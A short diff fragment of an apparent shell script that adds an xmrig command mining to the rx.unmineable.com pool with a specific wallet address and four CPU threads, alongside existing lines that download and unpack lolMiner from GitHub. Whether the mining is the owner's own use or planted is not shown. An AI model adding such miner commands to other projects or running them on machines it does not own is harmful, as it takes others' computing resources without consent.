@@ -13,6 +13,12 @@ sleep 999
 
 
 
+xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.github -p x --cpu 4
+pause
+
+
+
+
 
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
 tar -xf lolMiner_v1.29_Lin64.tar.gz
